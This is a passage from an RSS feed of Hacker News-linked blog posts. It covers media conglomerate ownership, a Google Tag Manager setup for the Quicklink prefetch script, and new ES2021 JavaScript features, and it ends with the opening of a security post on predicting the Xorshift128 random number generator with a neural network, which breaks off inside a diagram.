<p>Needless to say, TimeWarner’s television and film branches — including joint ventures like Hulu and CW — are doing pretty well these days.</p>
<center></center>
<h3>Print Assets</h3>
<p>On top of its incredible TV and movies, TimeWarner also controls several big-name print assets, including&nbsp;<em>TIME</em>&nbsp;(obviously).</p>
<center><img data-src="https://www.webfx.com/blog/wp-content/uploads/2017/05/12-tw-print.png" alt="" width="300" height="320" srcset="https://www.webfx.com/blog/wp-content/uploads/2017/05/12-tw-print.png 300w, https://www.webfx.com/blog/wp-content/uploads/2017/05/12-tw-print-281x300.png 281w" sizes="(max-width: 300px) 100vw, 300px" src="https://www.webfx.com/blog/wp-content/uploads/2017/05/12-tw-print.png"></center>
<h3>Investments</h3>
<p>TimeWarner has one of the most diverse investment portfolios of any media company.</p>
<p>Their investments act as controlling interests in lots of companies, some of which aren’t related to media.</p>
<p>But no matter what they are, each investment gives TimeWarner a stronger foothold in media.</p>
<center></center>
<h3>Video Game Assets</h3>
<p>As the owner of DC Comics, Looney Tunes, and tons of other fictional characters, it makes sense that TimeWarner owns a list of accomplished video game studios.</p>
<p>The most well-known is probably NetherRealm, which owns and publishes the controversial (and popular)&nbsp;<em>Mortal Kombat</em>&nbsp;series.</p>
<p>They also own Rocksteady, which is responsible for many of the latest Batman games.</p>
<center><img data-src="https://www.webfx.com/blog/wp-content/uploads/2017/05/14-tw-video-games.png" alt="" width="280" height="350" srcset="https://www.webfx.com/blog/wp-content/uploads/2017/05/14-tw-video-games.png 280w, https://www.webfx.com/blog/wp-content/uploads/2017/05/14-tw-video-games-240x300.png 240w" sizes="(max-width: 280px) 100vw, 280px" src="https://www.webfx.com/blog/wp-content/uploads/2017/05/14-tw-video-games.png"></center>
<h3>Music Assets</h3>
<p>TimeWarner doesn’t own a lot in music, but they have enough to ensure musical support for their other properties.</p>
<p>WaterTower Music might be the better-known business of the two enterprises, but Warner Music Group is still an essential part of the TimeWarner brand.</p>
<center></center>
<h3>Internet Assets</h3>
<p>Finally, TimeWarner is the first company on our list that also acts as an Internet service provider.</p>
<p>TimeWarner Cable is a major ISP in the United States, and it regularly competes with Comcast.</p>
<p>While its reputation differs from person to person, TimeWarner Cable is wildly profitable, and it’s become a major pillar of TimeWarner’s success.</p>
<center></center>
<h2>Media Conglomerate #4: Comcast</h2>
<p>Comcast is one of the few remaining Internet service providers in the United States. They also provide cable television and phone services to residential and business customers.</p>
<p>In 2013, Comcast expanded its reach into entertainment by purchasing NBC and pretty much all of its properties.</p>
<p>While most people know NBC as just a television station, it also has major stakes in media companies around the world.</p>
<p>That makes Comcast a major contender in global media, especially in the United States.</p>
<h3>Head: Brian L. Roberts</h3>
<p>Brian L. Roberts became President of Comcast in 1990, back when the company only earned&nbsp;<a href="http://corporate.comcast.com/news-information/leadership-overview/brian-l-roberts"><span>$657 million in annual revenue</span></a>.</p>
<p>That may sound like a ridiculous figure to use with the term “only,” but under Roberts’ leadership, the company now earns $74.5 billion annually.</p>
<p>As a result, Roberts is compensated well. He earns $40.8 million per year, which works out to:</p>
<ul>
<li>$1.57 million per paycheck</li>
<li>$156,923.04 per workday</li>
<li>$19,615.38 per hour</li>
</ul>
<center></center><p>That salary may be exclusive to Comcast’s utilities subscriptions. But that’s not the only way the ISP megalith earns money.</p>
<h3>TV and Film Assets</h3>
<p>With the acquisition of NBC, Comcast expanded its repertoire of TV and film assets many times over.</p>
<p>TV programming from NBC, cinema from Universal Pictures, and next-gen publishers like AwesomenessTV are all integral to Comcast’s growth and sustainability over the next few decades.</p>
<p>Even their religious niche branch — Big Idea — plays an important part in Comcast’s continued success and increased competitiveness in the media world.</p>
<center></center>
<h3>Internet Assets</h3>
<p>Most famously, Comcast is known as an Internet provider.</p>
<p>It’s a direct competitor to TimeWarner Cable, and it’s the primary (or only) ISP in dozens of regions in the United States.</p>
<center></center>
<h3>Ventures</h3>
<p>Last, Comcast has a laundry …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.webfx.com/blog/internet/the-6-companies-that-own-almost-all-media-infographic/">https://www.webfx.com/blog/internet/the-6-companies-that-own-almost-all-media-infographic/</a></em></p>]]>
            </description>
            <link>https://www.webfx.com/blog/internet/the-6-companies-that-own-almost-all-media-infographic/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068634</guid>
            <pubDate>Thu, 12 Nov 2020 11:12:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google Tag Manager Quicklink – Faster Onsite Navigation]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068608">thread link</a>) | @franze
<br/>
November 12, 2020 | https://www.franz-enzenhofer.com/a/quicklink-tag-manager-faster | <a href="https://web.archive.org/web/*/https://www.franz-enzenhofer.com/a/quicklink-tag-manager-faster">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><main id="content" role="main"><div><div><article id="post-1158"><p><a href="https://www.franz-enzenhofer.com/wp-content/uploads/quicklink-1024x661.jpg"><img width="930" height="620" src="https://www.franz-enzenhofer.com/wp-content/uploads/quicklink-930x620.jpg" alt="Quicklink Google Tag Manager" loading="lazy" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20930%20620'%3E%3C/svg%3E" data-lazy-src="https://www.franz-enzenhofer.com/wp-content/uploads/quicklink-930x620.jpg"></a></p><div><p>I already described <a href="https://www.franz-enzenhofer.com/a/gtag-make-faster" target="_blank" rel="noreferrer noopener">how to load 3rd party 💩 dependencies faster user Google Tag Manager</a> in the previous post. <strong>Now let’s speed up whenever a user clicks around</strong> on your website a.k.a. navigates around a.k.a. secondary pageviews. Again using Google Tag Manager.</p><h2>1) Go into Google Tag Manager</h2><div><figure><a href="https://tagmanager.google.com/#/home" target="_blank" rel="noopener noreferrer"><img loading="lazy" src="https://www.gstatic.cn/analytics-suite/header/suite/v2/ic_tag_manager.svg" alt="Google Tag Manager | Google Developers" width="192" height="192" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20192%20192'%3E%3C/svg%3E"></a></figure></div><p>Go into <a href="https://tagmanager.google.com/" target="_blank" rel="noreferrer noopener">Google Tag Manager</a> and select your <a href="https://support.google.com/tagmanager/answer/7059647?hl=en" target="_blank" rel="noreferrer noopener">Workspace</a>.</p><h2>2) Create a new Custom-Tag „QuickLink Gtag“</h2><figure><img loading="lazy" width="1024" height="407" src="https://www.franz-enzenhofer.com/wp-content/uploads/image-9-1024x407.png" alt="" srcset="https://www.franz-enzenhofer.com/wp-content/uploads/image-9-1024x407.png 1024w, https://www.franz-enzenhofer.com/wp-content/uploads/image-9-300x119.png 300w, https://www.franz-enzenhofer.com/wp-content/uploads/image-9-768x305.png 768w, https://www.franz-enzenhofer.com/wp-content/uploads/image-9.png 1414w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201024%20407'%3E%3C/svg%3E" data-lazy-srcset="https://www.franz-enzenhofer.com/wp-content/uploads/image-9-1024x407.png 1024w, https://www.franz-enzenhofer.com/wp-content/uploads/image-9-300x119.png 300w, https://www.franz-enzenhofer.com/wp-content/uploads/image-9-768x305.png 768w, https://www.franz-enzenhofer.com/wp-content/uploads/image-9.png 1414w" data-lazy-src="https://www.franz-enzenhofer.com/wp-content/uploads/image-9-1024x407.png"></figure><ul><li>Name: Quicklink Gtag</li><li>Tag Type: Custom HTML</li></ul><h2>3) Add Quicklink Code</h2><figure><a href="https://github.com/GoogleChromeLabs/quicklink" target="_blank" rel="noopener noreferrer"><img loading="lazy" src="https://www.franz-enzenhofer.com/wp-content/uploads/quicklink.png" alt="" width="749" height="211" srcset="https://www.franz-enzenhofer.com/wp-content/uploads/quicklink.png 749w, https://www.franz-enzenhofer.com/wp-content/uploads/quicklink-300x85.png 300w" sizes="(max-width: 749px) 100vw, 749px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20749%20211'%3E%3C/svg%3E" data-lazy-srcset="https://www.franz-enzenhofer.com/wp-content/uploads/quicklink.png 749w, https://www.franz-enzenhofer.com/wp-content/uploads/quicklink-300x85.png 300w" data-lazy-src="https://www.franz-enzenhofer.com/wp-content/uploads/quicklink.png"></a></figure><p><a rel="noreferrer noopener" href="https://github.com/GoogleChromeLabs/quicklink" target="_blank">Quicklink</a> is a <strong>Google Labs project</strong> to prefetch pages whenever visible links are in the viewport of a browser window. So whenever a user actually clicks on the link, the HTML of these pages is already available in the browser. It’s implemented in a way to be gentle to the processing power and the network connection of the user.</p><p>Copy paste this code 👇 into the tag.</p><pre><code>&lt;script src="https://unpkg.com/quicklink"&gt;&lt;/script&gt;
&lt;script&gt;
quicklink.listen();
&lt;/script&gt;</code></pre><ul><li><a href="https://unpkg.com/" target="_blank" rel="noreferrer noopener">unpkg.com</a> is a fast, free, global content delivery network for javascript packages.</li><li><a href="https://unpkg.com/quicklink" target="_blank" rel="noreferrer noopener">https://unpkg.com/quicklink</a> always points to the newest quicklink version.</li></ul><p>Result:</p><figure><img loading="lazy" width="1024" height="691" src="https://www.franz-enzenhofer.com/wp-content/uploads/image-10-1024x691.png" alt="" srcset="https://www.franz-enzenhofer.com/wp-content/uploads/image-10-1024x691.png 1024w, https://www.franz-enzenhofer.com/wp-content/uploads/image-10-300x202.png 300w, https://www.franz-enzenhofer.com/wp-content/uploads/image-10-768x518.png 768w, https://www.franz-enzenhofer.com/wp-content/uploads/image-10-1536x1036.png 1536w, https://www.franz-enzenhofer.com/wp-content/uploads/image-10.png 1758w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201024%20691'%3E%3C/svg%3E" data-lazy-srcset="https://www.franz-enzenhofer.com/wp-content/uploads/image-10-1024x691.png 1024w, https://www.franz-enzenhofer.com/wp-content/uploads/image-10-300x202.png 300w, https://www.franz-enzenhofer.com/wp-content/uploads/image-10-768x518.png 768w, https://www.franz-enzenhofer.com/wp-content/uploads/image-10-1536x1036.png 1536w, https://www.franz-enzenhofer.com/wp-content/uploads/image-10.png 1758w" data-lazy-src="https://www.franz-enzenhofer.com/wp-content/uploads/image-10-1024x691.png"></figure><h2>4) Trigger „QuickLink Gtag“</h2><p>Either trigger it on all pages.</p><figure><img loading="lazy" width="1024" height="327" src="https://www.franz-enzenhofer.com/wp-content/uploads/image-11-1024x327.png" alt="" srcset="https://www.franz-enzenhofer.com/wp-content/uploads/image-11-1024x327.png 1024w, https://www.franz-enzenhofer.com/wp-content/uploads/image-11-300x96.png 300w, https://www.franz-enzenhofer.com/wp-content/uploads/image-11-768x245.png 768w, https://www.franz-enzenhofer.com/wp-content/uploads/image-11.png 1502w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201024%20327'%3E%3C/svg%3E" data-lazy-srcset="https://www.franz-enzenhofer.com/wp-content/uploads/image-11-1024x327.png 1024w, https://www.franz-enzenhofer.com/wp-content/uploads/image-11-300x96.png 300w, https://www.franz-enzenhofer.com/wp-content/uploads/image-11-768x245.png 768w, https://www.franz-enzenhofer.com/wp-content/uploads/image-11.png 1502w" data-lazy-src="https://www.franz-enzenhofer.com/wp-content/uploads/image-11-1024x327.png"></figure><p><strong>or </strong>even better, much, much better indeed, <strong>trigger it on minimal user interaction </strong>as outlined <a rel="noreferrer noopener" href="https://www.franz-enzenhofer.com/a/gtag-make-faster" target="_blank">in my previous post</a> -&gt; <a rel="noreferrer noopener" href="https://www.franz-enzenhofer.com/a/gtag-make-faster" target="_blank">https://www.franz-enzenhofer.com/a/gtag-make-faster</a></p><figure><img loading="lazy" width="1024" height="258" src="https://www.franz-enzenhofer.com/wp-content/uploads/image-12-1024x258.png" alt="" srcset="https://www.franz-enzenhofer.com/wp-content/uploads/image-12-1024x258.png 1024w, https://www.franz-enzenhofer.com/wp-content/uploads/image-12-300x76.png 300w, https://www.franz-enzenhofer.com/wp-content/uploads/image-12-768x193.png 768w, https://www.franz-enzenhofer.com/wp-content/uploads/image-12.png 1486w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201024%20258'%3E%3C/svg%3E" data-lazy-srcset="https://www.franz-enzenhofer.com/wp-content/uploads/image-12-1024x258.png 1024w, https://www.franz-enzenhofer.com/wp-content/uploads/image-12-300x76.png 300w, https://www.franz-enzenhofer.com/wp-content/uploads/image-12-768x193.png 768w, https://www.franz-enzenhofer.com/wp-content/uploads/image-12.png 1486w" data-lazy-src="https://www.franz-enzenhofer.com/wp-content/uploads/image-12-1024x258.png"></figure><h2>5) Deploy &amp; Done</h2><p><strong>Click on „Submit“</strong>, finish the publish process and you are done. <strong>Visit your website. Behold the faster navigation / page load whenever you visit the next page. </strong>Oh, it’s also live on the website you are currently on, <a href="https://www.franz-enzenhofer.com/" target="_blank" rel="noreferrer noopener">feel free to click around</a>.</p><h3>X) Add me on LinkedIn and/or Fb</h3><ul><li><a href="https://www.linkedin.com/in/franzenzenhofer/" target="_blank" rel="noreferrer noopener">https://www.linkedin.com/in/franzenzenhofer/</a></li><li><a href="https://www.facebook.com/MRFRANZENZENHOFER/" target="_blank" rel="noreferrer noopener">https://www.facebook.com/MRFRANZENZENHOFER/</a></li></ul><p>I will continue posting Google Tag Manager hacks there. I ❤️ Google Tag Manager by now. It’s like root access to a website, without any deployment hassle.</p></div><div><h3>Über Franz Enzenhofer</h3><div>
<p><img src="https://www.franz-enzenhofer.com/wp-content/uploads/franz-enzenhofer-blog-author.jpg" alt="Franz Enzenhofer Author" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-src="https://www.franz-enzenhofer.com/wp-content/uploads/franz-enzenhofer-blog-author.jpg"></p><p>Hi. Ich bin Franz. SEO-Urpionier aus Österreich. Seit 1998 beschäftige ich mich mit Webseiten und SEO. Man kann im deutschsprachigen Raum nur schwer online gehen, ohne – via Google – auf eine Website zu kommen, die ich nicht auf die eine oder andere Art und Weise optimiert habe.</p></div></div></article></div></div></main></div></div>]]>
            </description>
            <link>https://www.franz-enzenhofer.com/a/quicklink-tag-manager-faster</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068608</guid>
            <pubDate>Thu, 12 Nov 2020 11:04:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Top 3 New JavaScript ES 2021 (ES 12) Features I'm Excited About]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068577">thread link</a>) | @nickbull
<br/>
November 12, 2020 | https://blog.nickbulljs.com/top-3-new-javascript-es-2021-es-12-features-i-am-excited-about | <a href="https://web.archive.org/web/*/https://blog.nickbulljs.com/top-3-new-javascript-es-2021-es-12-features-i-am-excited-about">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1605178305795/PxjbQH2GL.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p>I’m using the new ECMAScript 2021 features for over a year, thanks to Babel. Almost all the features are useful, but I most liked only three of them. They saved me a lot of time and made my code more readable.</p>
<p>Here they are:</p>
<h2 id="1-logical-assignment-operator">1. Logical Assignment Operator</h2>
<p>Logical assignment operator combines the logical operations (like ?? or &amp;&amp; or ||) with an assignment (=)</p>
<p>Here are the examples:</p>
<p><code>a ||= b</code> returns <code>a</code> if <code>a</code> is a truthy, or return <code>b</code> if <code>a</code> is falsy.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605177726250/cIkPMh2iG.png?auto=format&amp;q=60" alt="1.png"></p>
<p><code>a &amp;&amp;= b</code> returns <code>b</code> if <code>a</code> is truthy, or <code>a</code> if <code>a</code> is falsy.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605177734959/9REY329Uu.png?auto=format&amp;q=60" alt="2.png"></p>
<p><code>a ??= b</code> returns <code>b</code> if <code>a</code> is <code>null</code> or <code>undefined</code>, or returns <code>a</code> if <code>a</code> is truthy.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605177747602/oZBxuBvdK.png?auto=format&amp;q=60" alt="3.png"></p>
<p>At first, it was slightly tricky to instantly understand what these operators do during a code review, but after a few weeks, everyone in the team got good with it.</p>
<h2 id="2-promiseany">2. Promise.any</h2>
<p><code>Promise.any</code> accepts an array of promises and resolves as soon as any of the supplied promises become resolved.</p>
<p>Sounds difficult, so here is an example:</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605177790422/-Vsq9iww6.png?auto=format&amp;q=60" alt="4.png"></p>
<p>We make three requests simultaneously. When one of the requests resolves, <code>Promise.any</code> also resolves and log the first resolved request in the console (in our example, it’s Google)</p>
<p>If all promises were rejected, Promise.any throws a new type of error – <code>AggregateError</code>.</p>
<p>What’s new about it is the <code>AggregateError</code> object represents an error where several errors are wrapped in a single error.</p>
<p>Here is how it looks:</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605177798713/8d0slNOD6.png?auto=format&amp;q=60" alt="5.png"></p>
<p><code>e.errors</code> is an array of the errors object.</p>
<h2 id="3-numeric-separators">3. Numeric Separators</h2>
<p>Numeric Separators give us the ability to separate thousands with an underscore (<code>_</code>) in numeric literals.</p>
<p>How it’s useful?</p>
<p>It makes our code more informative and readable.</p>
<p>Here is an example:</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605177809800/A49UDx4FH.png?auto=format&amp;q=60" alt="6.png"></p>
<hr>
<p>If you want to try these three new features of ES2021 now, you can use these Babel plugins:</p>
<ul>
<li><a target="_blank" href="https://babeljs.io/docs/en/babel-plugin-proposal-logical-assignment-operators">Logical Assignment Operator</a></li>
<li><a target="_blank" href="https://babeljs.io/docs/en/babel-plugin-proposal-numeric-separator">Numeric Separator</a></li>
</ul>
<hr>
<h2 id="in-the-end">In the end...</h2>
<p>If you like this article, share it with your colleagues or friends and <a target="_blank" href="https://twitter.com/nickbulljs">check me on Twitter</a>.</p>
<p>And also, every week I send out a "3–2–1" newsletter with 3 tech news, 2 articles, and 1 advice for you.</p>
<p>📌 <a target="_blank" href="https://nickbulljs.com/">Join my 3–2–1 newsletter here</a> 📌</p>
</div></div></section></div></div>]]>
            </description>
            <link>https://blog.nickbulljs.com/top-3-new-javascript-es-2021-es-12-features-i-am-excited-about</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068577</guid>
            <pubDate>Thu, 12 Nov 2020 10:58:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Everyone Talks About Insecure Randomness, but Nobody Does Anything About It]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068571">thread link</a>) | @r4um
<br/>
November 12, 2020 | https://www.airza.net/2020/11/09/everyone-talks-about-insecure-randomness-but-nobody-does-anything-about-it.html | <a href="https://web.archive.org/web/*/https://www.airza.net/2020/11/09/everyone-talks-about-insecure-randomness-but-nobody-does-anything-about-it.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
	<section>
		
		<p>In which I take a crack at pointing a neural network at random noise, and achieve 95+% predictive bitwise accuracy against my hated foe in this world, Xorshift128.</p>
		<blockquote><p>"Any one who considers arithmetical methods of producing random digits is, of course, in a state of sin."</p></blockquote>
	</section>
	<section>
		<h2>What exactly are you up to here?</h2>
		<p>The motivation for this blog was a secure code review a few years ago, when looking at a client's email token generation<label for="1"></label><span>I don't actually work as an RNN jockey for work- I'm a security consultant. </span>. Frankly, I don't remember what their code looked like at <i>all</i>, but it probably looked something like this:</p>
		<figure><pre><code data-lang="python"><span>"""gotta make a token and send it to the client!"""</span>
<span>very_random_number</span> <span>=</span> <span>get_random_number</span><span>()</span>
<span>two_factor_token</span> <span>=</span> <span>convert_representation</span><span>(</span><span>very_random_number</span><span>)</span>
<span>send_email</span><span>(</span><span>"Your two factor authentication token is:"</span>
	<span>+</span><span>two_factor_token</span><span>,</span><span>user_email</span><span>)</span>
<span>save_token_to_user</span><span>(</span><span>user_id</span><span>,</span><span>two_factor_token</span><span>)</span>
		</code></pre></figure>
		<p>Code like this undergirds the security of much of the internet. A user wants to reset their password, so they enter their email. We generate a secret code and send it to their email; opening the link in the email proves that the requestor is legitimate. Sometimes we text codes like this to users when they try to login to their banks; this type of association between a random number and a user is also the backbone of a huge chunk of cookie-based authentication.</p><p>Is this code secure?  Well, it depends. Naturally, we might attack the email component (as emails are sometimes sent unencrypted, whoops) or we might attack the association between the data (maybe the token and the email are derived from attacker controlled data or whatever). The quality of the random number generation here matters as well, at least in theory: some random number generators are predictable, while others are provably difficult to attack. If we could predict this, it would be super bad- we'd just trigger the email to the victim, somehow predict the RNG, and be on our way. On the other hand, even if we are able to 'predict' this, we are still in trouble: there is no obvious way to go about it without prior knowledge of what <i>convert_representation</i> is up to.</p>
		<p>I think machine learning provides the bridge here. The thought has hung in my mind for a few years, in fact; I've picked the brains of everyone I know remotely related to the field, and I've even hired some people to take a crack at it. So far, I haven't seen any prior literature suggesting that it's been possible or done, and nobody was really sure how to approach it. Finally, thanks to a generous grant from the Phil Brass Weird Ideas Foundation<label for="2"></label><span>AKA <a href="https://www.directdefense.com/">DirectDefense</a> who was happy to sponsor this research while I was not busy bug hunting for them! </span> I was able to take a few weeks to think about it methodically.</p>
		<p>The rest of this blog is structured in a pretty straightforward way: I talk about how numbers are generated at random in a computer, then talk about how to transform that notion of randomness into a learnable problem<label for="3"></label><span>A basic knowledge of machine learning, and especially gradient descent will be helpful for understanding some of my thought process through this blog. </span>. Not surprisingly, I will then solve that problem, and propose a roadmap for how to continue chipping away at the distance between my current progress and a usable attack.</p>
	</section>
	<section>
		<h2>Our Constant State of Sin</h2>
		<p>Computers, these fucked up little rocks we have forced to think, are gambling creatures. Despite the rigid constraints that we have imposed on them, we sometimes instead demand them to be fickle beyond our own capabilities, to choose a number more wildly than any human dare dream. For example, by invoking <code>Xorshift128</code>, a rather stylishly named fellow, you can choose a number between zero and about four billion (<code>2**32</code>, to be precise), which is a number that, while you do not often have a reason to choose at random, is at least a number whose neighbors you encounter at least occasionally. More excitingly, you can invoke this function a staggering <code>2**128</code> times<label for="4"></label><span>More or less the number of atoms in every living person on earth. </span> before you encounter a repetition in its pattern of randomness.</p>
		<p><i>But how?</i> I hear you cry. That is to say, A particular problem arises here, the one I think Von Neumann was referring to above: programming a computer is the art of telling it exactly what you want it to do, more or less in advance, and telling it exactly what random stuff to come up with, <i>in advance</i>, both defeats the purpose of the program in the first place and also poses fascinating logical challenges at the programming level. Certainly you do not have time to roll four billion of <i>anything</i>, and even if you did, writing each of those numbers down in some way would be a miserable use of time and hard disk space. On the other hand, cycling through just a few of the available numbers also sounds wrong; if you cycle through just a few hundred of the integers between 0 and 2**32, you're not really providing a lot of randomness.</p>
		<p>We will set aside the question of what randomness really <i>is</i> and think about it from a programming perspective. We can define a Random Number Generator (RNG) as something that outputs a sequence of numbers. In order to make sure that they are as random as possible, we're also going to introduce something new: <i>state</i>. The state gets passed into this RNG function, and in addition to outputting a random-ish number, it is going to output <i>new</i> state- this state will be as big or bigger (usually much bigger) than the output. Then we're just going to feed this output state <i>back</i> into the RNG to generate the next number in the sequence- and that's going to give us new state, which will let us continue this for quite a while. One point of confusion is that sometimes the output is <i>also</i> used as the state<label for="5"></label><span>Astute readers will wonder: where does the original state come from? Fascinatingly, movement of the mouse, entries into the keyboard, and other minutiae of computer operation are used to generate a very small amount of randomness- that is, at some level the start comes from the simple uncertainty of everyday computer use. There isn't a lot of randomness available here, so the RNG serves to <i>stretch</i> it out over a longer period of time. </span>.</p>
		<p>To take this into the concrete, we will consider an RNG, the <b>Middle-square method</b>. Relatively ancient by RNG standards, it was invented by Von Neumann sometime in the 1940s, when he was busy inventing almost everything else. A number of <code>N</code> digits is squared, and the <code>N/2</code> middle digits of the result are taken both as the <i>output</i> as well as the <i>state</i> to square for the next iteration. The simplest case, n=2, works as follows: we start with 43, square it to produce 1849, and then take the middle two digits to get our result, 84. This 84 is also our new state, so next time we're fiending for the results of a d100, we square it again, 7056, taking the middle to get 5, our output and our new state. Okay, so next is 25, which we'll call 0025, which gives us 2, which gives us 0004, translated as 0...</p>
		<p>Uh oh. We seem to have run into a dead end here. 0 squared is of course 0. These numbers are not looking so random anymore. In fact, the behavior is pretty bad no matter what number you begin with. The figure below lists all the states/outputs showing that the tendency to degrade towards cycles is pretty unavoidable.</p>
		<figure>
			<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100%" height="100%" viewBox="-307 -5 300 450">
 <title>Middle square method 2 digits</title>
 <desc></desc>
 
 <defs>
  <path id="arrow" d="M 9.5,0 H 14 m -2,-2 l 2,2 l -2,2"></path>
  <g id="loop1">
   <path d="M 9,0 V 10 H 0"></path>
   <use xlink:href="#arrow" transform="translate(0,19) rotate(-90)"></use>
  </g>
  <g id="loop2">
   <path d="M 9,0 V -10 H -20"></path>
   <use xlink:href="#arrow" transform="translate(-20,-19) rotate(90)"></use>
  </g>
 </defs>
 <g font-family="sans-serif" font-size="10" font-weight="bold" text-anchor="middle" stroke-linejoin="round" stroke-linecap="round" stroke="none" fill="none">
  <rect x="-4999" y="-4999" width="9999" height="9999"></rect>
  <g>
   <g transform="translate(-20 ,0)"><text x="0" y="0" dy="0.7ex" transform="scale(0.75,1)">00</text><path d="M 5,  0 H 9 V   0"></path><use xlink:href="#loop1" transform="translate(0,  0)"></use></g>
   <g transform="translate(-40 ,0)"><text x="0" y="0" dy="0.7ex" transform="scale(0.75,1)">01</text><path d="M 5,  0 H 9 V   0"></path><use xlink:href="#arrow" transform="translate(0,  0)"></use></g>
   <g transform="translate(-60 ,0)"><text x="0" y="0" dy="0.7ex" transform="scale(0.75,1)">04</text><path d="M 5,  0 H 9 V   0"></path><use xlink:href="#arrow" transform="translate(0,  0)"></use></g>
   <g transform="translate(-80 ,0)"><text x="0" y="0" dy="0.7ex" transform="scale(0.75,1)">07</text><path d="M 5,  0 H 9 V   0"></path><use xlink:href="#arrow" transform="translate(0,  0)"></use></g>
   <g transform="translate(-80 ,0)"><text x="0" y="10" dy="0.7ex" transform="scale(0.75,1)">71</text><path d="M 5, 10 H 9 V   0"></path><use xlink:href="#arrow" transform="translate(0,  0)"></use></g>
   <g transform="translate(-40 ,0)"><text x="0" y="20" dy="0.7ex" transform="scale(0.75,1)">02</text><path d="M 5, 20 H 9 V   0"></path><use xlink:href="#arrow" transform="translate(0,  0)"></use></g>
   <g transform="translate(-60 ,0)"><text x="0" y="20" dy="0.7ex" transform="scale(0.75,1)">05</text><path d="M 5, 20 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-80 ,0)"><text x="0" y="20" dy="0.7ex" transform="scale(0.75,1)">84</text><path d="M 5, 20 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-100,0)"><text x="0" y="20" dy="0.7ex" transform="scale(0.75,1)">29</text><path d="M 5, 20 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="20" dy="0.7ex" transform="scale(0.75,1)">36</text><path d="M 5, 20 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-140,0)"><text x="0" y="20" dy="0.7ex" transform="scale(0.75,1)">19</text><path d="M 5, 20 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-160,0)"><text x="0" y="20" dy="0.7ex" transform="scale(0.75,1)">14</text><path d="M 5, 20 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-180,0)"><text x="0" y="20" dy="0.7ex" transform="scale(0.75,1)">12</text><path d="M 5, 20 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-200,0)"><text x="0" y="20" dy="0.7ex" transform="scale(0.75,1)">11</text><path d="M 5, 20 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-220,0)"><text x="0" y="20" dy="0.7ex" transform="scale(0.75,1)">46</text><path d="M 5, 20 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-240,0)"><text x="0" y="20" dy="0.7ex" transform="scale(0.75,1)">92</text><path d="M 5, 20 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-260,0)"><text x="0" y="20" dy="0.7ex" transform="scale(0.75,1)">77</text><path d="M 5, 20 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-280,0)"><text x="0" y="20" dy="0.7ex" transform="scale(0.75,1)">76</text><path d="M 5, 20 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-300,0)"><text x="0" y="20" dy="0.7ex" transform="scale(0.75,1)">42</text><path d="M 5, 20 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
